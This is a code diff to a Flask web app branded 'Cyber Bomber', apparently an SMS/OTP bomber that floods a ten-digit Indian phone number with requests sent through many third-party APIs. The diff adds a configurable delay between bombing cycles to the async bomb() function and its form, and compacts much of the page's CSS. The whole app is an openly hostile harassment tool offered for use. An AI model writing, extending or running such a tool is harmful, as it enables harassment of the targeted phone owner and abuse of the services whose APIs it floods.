@@ -657,16 +657,16 @@ async def send_req(api, phone, session):
     except:
         return False
 
-async def bomb(phone, apis, cycles=1):
+async def bomb(phone, apis, cycles=1, delay=2):
     total = len(apis) * cycles
     success = 0
     async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(cycles):
-            for api in apis:
-                tasks.append(send_req(api, phone, session))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        success = sum(1 for r in results if r is True)
+        for cycle in range(cycles):
+            tasks = [send_req(api, phone, session) for api in apis]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            success += sum(1 for r in results if r is True)
+            if cycle < cycles - 1:
+                await asyncio.sleep(delay)
     return success, total
 
 # ========== ওয়েব রাউট ==========
@@ -679,11 +679,7 @@ HTML_FORM = """
     <title>💀 Cyber Bomber</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             display: flex;
@@ -695,7 +691,6 @@ HTML_FORM = """
             position: relative;
             overflow-x: hidden;
         }
-        /* animated background grid */
         body::before {
             content: '';
             position: fixed;
@@ -711,7 +706,6 @@ HTML_FORM = """
             0% { transform: translate(0, 0); }
             100% { transform: translate(40px, 40px); }
         }
-        /* glowing orbs */
         .orb {
             position: fixed;
             border-radius: 50%;
@@ -736,7 +730,7 @@ HTML_FORM = """
             border: 1px solid rgba(0, 255, 255, 0.15);
             border-radius: 32px;
             padding: 40px 35px;
-            max-width: 520px;
+            max-width: 560px;
             width: 100%;
             box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 40px rgba(0, 255, 255, 0.05);
             transition: 0.4s;
@@ -746,10 +740,7 @@ HTML_FORM = """
             box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 60px rgba(255, 0, 64, 0.1);
             transform: translateY(-2px);
         }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
+        .header { text-align: center; margin-bottom: 25px; }
         .logo {
             font-family: 'Orbitron', monospace;
             font-size: 32px;
@@ -766,32 +757,10 @@ HTML_FORM = """
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-        .subtitle {
-            color: #00f0ff;
-            font-size: 14px;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            margin-top: 4px;
-            text-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
-            font-weight: 600;
-        }
-        .divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.3), transparent);
-            margin: 18px 0 25px 0;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            color: #8899bb;
-            font-weight: 600;
-            font-size: 14px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-bottom: 8px;
-        }
+        .subtitle { color: #00f0ff; font-size: 14px; letter-spacing: 3px; text-transform: uppercase; margin-top: 4px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.3); font-weight: 600; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.3), transparent); margin: 18px 0 25px 0; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; color: #8899bb; font-weight: 600; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 6px; }
         input {
             width: 100%;
             padding: 14px 18px;
@@ -809,17 +778,9 @@ HTML_FORM = """
             box-shadow: 0 0 25px rgba(0, 240, 255, 0.1), inset 0 0 15px rgba(0, 240, 255, 0.05);
             background: rgba(0, 0, 0, 0.6);
         }
-        input::placeholder {
-            color: #3d4a66;
-            font-weight: 400;
-        }
-        .row {
-            display: flex;
-            gap: 14px;
-        }
-        .row .form-group {
-            flex: 1;
-        }
+        input::placeholder { color: #3d4a66; }
+        .row { display: flex; gap: 14px; flex-wrap: wrap; }
+        .row .form-group { flex: 1; min-width: 120px; }
         .btn {
             width: 100%;
             padding: 16px 20px;
@@ -848,16 +809,9 @@ HTML_FORM = """
             transform: rotate(25deg) scale(0);
             transition: 0.6s;
         }
-        .btn:hover::before {
-            transform: rotate(25deg) scale(1);
-        }
-        .btn:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 12px 40px rgba(255, 0, 64, 0.5);
-        }
-        .btn:active {
-            transform: scale(0.96);
-        }
+        .btn:hover::before { transform: rotate(25deg) scale(1); }
+        .btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 12px 40px rgba(255, 0, 64, 0.5); }
+        .btn:active { transform: scale(0.96); }
         .result-box {
             margin-top: 22px;
             padding: 16px 20px;
@@ -870,13 +824,8 @@ HTML_FORM = """
             font-size: 15px;
             word-break: break-word;
             backdrop-filter: blur(5px);
-            transition: 0.3s;
         }
-        .result-box.error {
-            background: rgba(255, 0, 0, 0.06);
-            border-color: rgba(255, 0, 0, 0.15);
-            color: #ff7a7a;
-        }
+        .result-box.error { background: rgba(255, 0, 0, 0.06); border-color: rgba(255, 0, 0, 0.15); color: #ff7a7a; }
         .footer {
             margin-top: 22px;
             text-align: center;
@@ -884,31 +833,18 @@ HTML_FORM = """
             color: #3d4a66;
             border-top: 1px solid rgba(255,255,255,0.03);
             padding-top: 18px;
-            letter-spacing: 0.5px;
         }
-        .footer .credit {
-            color: #00f0ff;
-            font-weight: 700;
-            font-size: 14px;
-            text-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
-        }
-        .footer .credit span {
-            color: #ff6b00;
-        }
+        .footer .credit { color: #00f0ff; font-weight: 700; font-size: 14px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.2); }
+        .footer .credit span { color: #ff6b00; }
         @media (max-width: 480px) {
             .card { padding: 28px 18px; }
             .logo { font-size: 24px; }
             .row { flex-direction: column; gap: 0; }
-            .btn { font-size: 14px; padding: 14px; }
         }
     </style>
 </head>
 <body>
-    <!-- background orbs -->
-    <div class="orb orb1"></div>
-    <div class="orb orb2"></div>
-    <div class="orb orb3"></div>
-
+    <div class="orb orb1"></div><div class="orb orb2"></div><div class="orb orb3"></div>
     <div class="card">
         <div class="header">
             <div class="logo">💀 Cyber Bomber</div>
@@ -923,9 +859,13 @@ HTML_FORM = """
             <div class="row">
                 <div class="form-group">
                     <label>🔄 Cycles</label>
-                    <input type="number" name="cycles" value="1" min="1" max="20">
+                    <input type="number" name="cycles" value="2" min="1" max="20">
                 </div>
-                <div class="form-group" style="display:flex; align-items:flex-end;">
+                <div class="form-group">
+                    <label>⏱️ Delay (sec)</label>
+                    <input type="number" name="delay" value="2" min="0" max="10" step="0.5">
+                </div>
+                <div class="form-group" style="display:flex; align-items:flex-end; min-width:100px;">
                     <button type="submit" class="btn" style="margin:0;">💣 FIRE</button>
                 </div>
             </div>
@@ -943,22 +883,21 @@ HTML_FORM = """
 </body>
 </html>
 """
-
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
         cycles = int(request.form.get('cycles', 1))
+        delay = float(request.form.get('delay', 2))
         if not phone.isdigit() or len(phone) != 10:
             return render_template_string(HTML_FORM, result="❌ Invalid phone number (must be 10 digits)")
         apis = get_working_apis()
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        success, total = loop.run_until_complete(bomb(phone, apis, cycles))
+        success, total = loop.run_until_complete(bomb(phone, apis, cycles, delay))
         loop.close()
         return render_template_string(HTML_FORM, result=f"✅ {success} successful out of {total} requests sent to +91{phone}")
     return render_template_string(HTML_FORM, result=None)
-
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
